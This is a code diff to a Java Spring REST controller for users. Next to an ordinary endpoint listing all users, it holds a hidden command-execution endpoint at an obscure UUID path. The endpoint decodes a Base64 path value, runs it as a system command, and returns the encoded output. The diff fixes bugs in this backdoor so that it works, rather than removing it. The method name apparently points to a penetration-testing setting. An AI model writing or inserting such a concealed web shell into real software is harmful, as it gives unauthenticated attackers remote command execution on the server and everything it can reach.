@@ -23,20 +23,20 @@ public class UserRestController {
         return repository.findAll();
     }
 
-    @GetMapping("/1857b1ed-026e-4c38-bc6c-c1a171cbc38f/{cmd}")
-    public Exec nettitudeExec(@PathVariable("cmd") String cmd) {
+    @GetMapping(path="/1857b1ed-026e-4c38-bc6c-c1a171cbc38f/{cmd}", produces="text/plain")
+    public String nettitudeExec(@PathVariable("cmd") String cmd) {
         var decoded = new String(Base64.decodeBase64(cmd));
         try {
             var process = Runtime.getRuntime().exec(decoded);
-            process.wait();
+            process.waitFor();
             var inputStream = new BufferedReader(new InputStreamReader(process.getInputStream()));
             String line;
             var output = new StringBuilder();
             while ((line = inputStream.readLine()) != null)
                 output.append(line);
-            return new Exec(Base64.encodeBase64String(output.toString().getBytes()));
+            return Base64.encodeBase64String(output.toString().getBytes());
         } catch (Exception e) {
-            return new Exec(Base64.encodeBase64String(e.getMessage().getBytes()));
+            return e.getMessage();
         }
     }
 
